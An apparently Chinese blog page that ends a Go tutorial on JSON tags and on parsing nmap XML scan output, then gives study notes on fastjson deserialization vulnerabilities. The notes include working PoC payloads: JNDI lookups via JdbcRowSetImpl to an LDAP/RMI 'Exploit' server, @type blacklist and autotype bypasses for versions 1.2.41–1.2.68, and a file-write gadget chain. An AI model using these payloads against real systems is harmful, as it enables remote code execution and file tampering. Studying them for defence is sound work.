<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name    <span class="type">string</span>  <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">    Age     Int     <span class="string">`json:&quot;int&quot;`</span></span><br><span class="line">    IdCard  <span class="type">string</span>  <span class="string">`json:&quot;-&quot;`</span>    <span class="comment">// 不会被编码到json中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在encoding&#x2F;json的源码中也有注释：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Field is ignored by this package.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;-&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Field appears in JSON as key &quot;myName&quot;.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;myName&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Field appears in JSON as key &quot;myName&quot; and</span></span><br><span class="line"><span class="comment">// the field is omitted from the object if its value is empty,</span></span><br><span class="line"><span class="comment">// as defined above.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;myName,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Field appears in JSON as key &quot;Field&quot; (the default), but</span></span><br><span class="line"><span class="comment">// the field is skipped if empty.</span></span><br><span class="line"><span class="comment">// Note the leading comma.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;,omitempty&quot;`</span></span><br></pre></td></tr></table></figure>

<p>omitempty意思是当元素数据为空时，在json中省略这个元素</p>
<h2 id="10、xml解析"><a href="#10、xml解析" class="headerlink" title="10、xml解析"></a>10、xml解析</h2><p>在遇到需要解析xml文件时，使用encoding&#x2F;xml库，也需要注意结构体元素名称首字母大写，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="comment">//&quot;github.com/asaskevich/govalidator&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/xml&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> NmapResult <span class="keyword">struct</span> &#123;</span><br><span class="line">    XMLName    xml.Name <span class="string">`xml:&quot;nmaprun&quot;`</span> </span><br><span class="line">    Host     []hostInfo <span class="string">`xml:&quot;host&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> hostInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;host&quot;`</span></span><br><span class="line">	Address   addressAttr <span class="string">`xml:&quot;address&quot;`</span></span><br><span class="line">	Ports    portInfo  <span class="string">`xml:&quot;ports&quot;`</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> portInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;ports&quot;`</span></span><br><span class="line">	Port    []portAttr     <span class="string">`xml:&quot;port&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> addressAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;address&quot;`</span></span><br><span class="line">	Addr    <span class="type">string</span>  <span class="string">`xml:&quot;addr,attr&quot;`</span></span><br><span class="line">	Addrtype  <span class="type">string</span> <span class="string">`xml:&quot;addrtype,attr&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> stateAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;state&quot;`</span></span><br><span class="line">	State    <span class="type">string</span>  <span class="string">`xml:&quot;state,attr&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> portAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;port&quot;`</span></span><br><span class="line">	Portid    <span class="type">string</span>  <span class="string">`xml:&quot;portid,attr&quot;`</span></span><br><span class="line">	Protocol  <span class="type">string</span>  <span class="string">`xml:&quot;protocol,attr&quot;`</span></span><br><span class="line">	State   stateAttr  <span class="string">`xml:&quot;state&quot;`</span></span><br><span class="line">	Service   serviceAttr  <span class="string">`xml:&quot;service&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> serviceAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;service&quot;`</span></span><br><span class="line">	Name    <span class="type">string</span>  <span class="string">`xml:&quot;name,attr&quot;`</span></span><br><span class="line">	Product  <span class="type">string</span> <span class="string">`xml:&quot;product,attr&quot;`</span></span><br><span class="line">	Method  <span class="type">string</span> <span class="string">`xml:&quot;method,attr&quot;`</span></span><br><span class="line">	Conf  <span class="type">string</span> <span class="string">`xml:&quot;conf,attr&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	content, err := ioutil.ReadFile(<span class="string">&quot;result1.xml&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;file read error&quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result NmapResult</span><br><span class="line">    fmt.Println(<span class="type">string</span>(content))</span><br><span class="line">    err = xml.Unmarshal(content, &amp;result)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;xml unmarshal error.&quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(result.Host[<span class="number">0</span>].Ports.Port[<span class="number">0</span>].Service)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE nmaprun&gt;</span><br><span class="line">&lt;?xml-stylesheet href=<span class="string">&quot;file:///usr/bin/../share/nmap/nmap.xsl&quot;</span> <span class="keyword">type</span>=<span class="string">&quot;text/xsl&quot;</span>?&gt;</span><br><span class="line">&lt;!-- Nmap <span class="number">7.60</span> scan initiated Thu Apr <span class="number">15</span> <span class="number">04</span>:<span class="number">43</span>:<span class="number">22</span> <span class="number">2021</span> as: nmap -sV -p <span class="number">80</span>,<span class="number">443</span> -oX result.xml <span class="number">220.181</span><span class="number">.38</span><span class="number">.149</span> <span class="number">111.225</span><span class="number">.218</span><span class="number">.3</span> --&gt;</span><br><span class="line">&lt;nmaprun scanner=<span class="string">&quot;nmap&quot;</span> args=<span class="string">&quot;nmap -sV -p 80,443 -oX result.xml 220.181.38.149 111.225.218.3&quot;</span> start=<span class="string">&quot;1618461802&quot;</span> startstr=<span class="string">&quot;Thu Apr 15 04:43:22 2021&quot;</span> version=<span class="string">&quot;7.60&quot;</span> xmloutputversion=<span class="string">&quot;1.04&quot;</span>&gt;</span><br><span class="line">&lt;scaninfo <span class="keyword">type</span>=<span class="string">&quot;syn&quot;</span> protocol=<span class="string">&quot;tcp&quot;</span> numservices=<span class="string">&quot;2&quot;</span> services=<span class="string">&quot;80,443&quot;</span>/&gt;</span><br><span class="line">&lt;verbose level=<span class="string">&quot;0&quot;</span>/&gt;</span><br><span class="line">&lt;debugging level=<span class="string">&quot;0&quot;</span>/&gt;</span><br><span class="line">&lt;host starttime=<span class="string">&quot;1618461803&quot;</span> endtime=<span class="string">&quot;1618461817&quot;</span>&gt;&lt;status state=<span class="string">&quot;up&quot;</span> reason=<span class="string">&quot;echo-reply&quot;</span> reason_ttl=<span class="string">&quot;47&quot;</span>/&gt;</span><br><span class="line">&lt;address addr=<span class="string">&quot;220.181.38.149&quot;</span> addrtype=<span class="string">&quot;ipv4&quot;</span>/&gt;</span><br><span class="line">&lt;hostnames&gt;</span><br><span class="line">&lt;/hostnames&gt;</span><br><span class="line">&lt;ports&gt;&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;80&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;47&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;Apache httpd&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:apache:http_server&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;443&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;47&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;Apache httpd&quot;</span> tunnel=<span class="string">&quot;ssl&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:apache:http_server&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;/ports&gt;</span><br><span class="line">&lt;times srtt=<span class="string">&quot;6451&quot;</span> rttvar=<span class="string">&quot;4476&quot;</span> to=<span class="string">&quot;100000&quot;</span>/&gt;</span><br><span class="line">&lt;/host&gt;</span><br><span class="line">&lt;host starttime=<span class="string">&quot;1618461803&quot;</span> endtime=<span class="string">&quot;1618461817&quot;</span>&gt;&lt;status state=<span class="string">&quot;up&quot;</span> reason=<span class="string">&quot;echo-reply&quot;</span> reason_ttl=<span class="string">&quot;48&quot;</span>/&gt;</span><br><span class="line">&lt;address addr=<span class="string">&quot;111.225.218.3&quot;</span> addrtype=<span class="string">&quot;ipv4&quot;</span>/&gt;</span><br><span class="line">&lt;hostnames&gt;</span><br><span class="line">&lt;/hostnames&gt;</span><br><span class="line">&lt;ports&gt;&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;80&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;48&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;nginx&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:igor_sysoev:nginx&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;443&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;48&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;nginx&quot;</span> tunnel=<span class="string">&quot;ssl&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:igor_sysoev:nginx&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;/ports&gt;</span><br><span class="line">&lt;times srtt=<span class="string">&quot;6792&quot;</span> rttvar=<span class="string">&quot;5344&quot;</span> to=<span class="string">&quot;100000&quot;</span>/&gt;</span><br><span class="line">&lt;/host&gt;</span><br><span class="line">&lt;runstats&gt;&lt;finished time=<span class="string">&quot;1618461817&quot;</span> timestr=<span class="string">&quot;Thu Apr 15 04:43:37 2021&quot;</span> elapsed=<span class="string">&quot;14.36&quot;</span> summary=<span class="string">&quot;Nmap done at Thu Apr 15 04:43:37 2021; 2 IP addresses (2 hosts up) scanned in 14.36 seconds&quot;</span> exit=<span class="string">&quot;success&quot;</span>/&gt;&lt;hosts up=<span class="string">&quot;2&quot;</span> down=<span class="string">&quot;0&quot;</span> total=<span class="string">&quot;2&quot;</span>/&gt;</span><br><span class="line">&lt;/runstats&gt;</span><br><span class="line">&lt;/nmaprun&gt;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-fastjson"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/02/21/fastjson/"
    >fastjson漏洞学习记录</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/02/21/fastjson/" class="article-date">
  <time datetime="2022-02-21T06:31:27.000Z" itemprop="datePublished">2022-02-21</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="1、fastjson介绍"><a href="#1、fastjson介绍" class="headerlink" title="1、fastjson介绍"></a>1、fastjson介绍</h2><p>​    FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。近几年来fastjson漏洞层出不穷，简单来说，就是Fastjson通过parseObject&#x2F;parse将传入的字符串反序列化为Java对象时由于没有进行合理检查而导致的</p>
<p>​    网上有很多的介绍以及讲解文章，这里只进行记录一些比较重要的点，讲解文章见参考链接</p>
<h2 id="2、fastjson使用"><a href="#2、fastjson使用" class="headerlink" title="2、fastjson使用"></a>2、fastjson使用</h2><h3 id="1）使用方式"><a href="#1）使用方式" class="headerlink" title="1）使用方式"></a>1）使用方式</h3><p>fastjson主要的反序列化方式为如下3种：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonstr);   <span class="comment">//jsonstr： &#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr, Test.class);   </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br></pre></td></tr></table></figure>
<p>其中第1，2种方式最终都会调用位于com.alibaba.fastjson.util.JavaBeanInfo.java中的JavaBeanInfo.build()方法来获取并保存目标Java类中的成员变量以及其对应的setter、getter<br><img src="/2022/02/21/fastjson/fastjson-1.png" alt="parse(左图)和parseObject(右图)的调用链"><br>二者后面的调用链是一样的，不同点在于JavaBeanInfo的clazz参数的来源不同<br>JSON.Parse(jsonstr)的clazz参数来源于jsonstr中的@type字段值；而JSON.parseObject的clazz参数来源于第二个参数Test.class，当@type字段值和test.class类名一致，则两者执行过程和结果是一致的</p>
<h3 id="2）使用结果"><a href="#2）使用结果" class="headerlink" title="2）使用结果"></a>2）使用结果</h3><p>第1、2种方式会在反序列化过程中调用setter方法以及getter方法，需要满足的条件如下（见JavaBeanInfo.build()方法源码）：<br>setter方法条件：<br>1、函数名长度大于4且以set开头<br>2、非静态函数<br>3、返回类型为void或当前类<br>4、参数个数为1个</p>
<p>getter方法条件：<br>1、方法名需要长于4<br>2、不是静态方法<br>3、以get字符串开头，且第四个字符需要是大写字母<br>4、方法不能有参数传入<br>5、继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong<br>6、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</p>
<p>第3种方式会调用所有的getter和setter方法（非私有属性），其源码如下：<br><img src="/2022/02/21/fastjson/fastjson-2.png" alt="parseObject函数源码"><br>就是执行了parse，随后将返回的Java对象通过JSON.toJSON（）转为JSONObject对象，JSON.toJSON()方法会将目标类中所有getter方法记录下来并随后通过反射依次调用目标类中所有的getter方法<br>​tips：若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行</p>
<h2 id="3、漏洞触发"><a href="#3、漏洞触发" class="headerlink" title="3、漏洞触发"></a>3、漏洞触发</h2><p>​在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发</p>
<h2 id="4、fastjson时间线"><a href="#4、fastjson时间线" class="headerlink" title="4、fastjson时间线"></a>4、fastjson时间线</h2><p><img src="/2022/02/21/fastjson/fastjson-3.png" alt="fastjson时间线"></p>
<p>在autotype开启的情况下才能根据@type字段值去反序列化指定的类，在jvm启动参数中添加如下参数来开启</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfastjson.parser.autoTypeSupport=true</span><br></pre></td></tr></table></figure>
<p>即使开了autoType也需要经过checkAutoType黑名单检测，白名单是直接加载，但默认白名单为空</p>
<p>fastjson的poc主要分成3部分：</p>
<h3 id="1）1-22-22-1-2-45"><a href="#1）1-22-22-1-2-45" class="headerlink" title="1）1.22.22-1.2.45"></a>1）1.22.22-1.2.45</h3><pre><code>这期间主要是1.2.24的poc，以及对补丁黑名单的绕过
</code></pre>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nice0e3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//               String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;   <span class="comment">//1.2.41绕过</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;   <span class="comment">// 1.2.42绕过</span></span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2）1-2-47"><a href="#2）1-2-47" class="headerlink" title="2）1.2.47"></a>2）1.2.47</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;]</span><br></pre></td></tr></table></figure>
<p>​    使用java.lang.class将com.sun.rowset.JdbcRowSetImpl加入到白名单中来绕过黑名单检测</p>
<h3 id="3）1-2-68"><a href="#3）1-2-68" class="headerlink" title="3）1.2.68"></a>3）1.2.68</h3><p>​    fastjson 1.2.68 更新了一个新的安全机制 safeMode，在开启的情况下 checkAutoType 方法会直接抛出异常。连绕过的机会都不给了，而且在陆陆续续的版本更迭 checkAutoType 方法的代码也更新了许多但是逻辑基本没变<br>​    但是被爆出在开启 AutoType 和 不开启 safeMode 的情况下可以通过 expectClass 绕过 AutoType，恶意类evil加载完成后会判断一次加载的类是否为 java.lang.AutoCloseable的子类，如果是的话才会 return clazz。这也是为啥我们构造的 Evil 里需要继承 java.lang.AutoCloseable</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>​    写文件的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;targetPath&quot;</span>: <span class="string">&quot;f:/test/pwn.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tempPath&quot;</span>: <span class="string">&quot;f:/test/test.txt&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,</span><br><span class="line">        <span class="string">&quot;buffer&quot;</span>: <span class="string">&quot;文件内容 base64 编码&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputStream&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;position&quot;</span>: <span class="number">5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;close&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5、jdk版本更新"><a href="#5、jdk版本更新" class="headerlink" title="5、jdk版本更新"></a>5、jdk版本更新</h3><p>即使成功调用了了lookup函数，也需要注意java版本是否支持加载远程类，jndi lookup的具体实现是在jdk中实现，即使fastjson调用了lookup函数，也需要看看java版本是否支持远程加载，具体版本关系如下：<br><img src="/2022/02/21/fastjson/fastjson-4.png" alt="jdk时间线"></p>
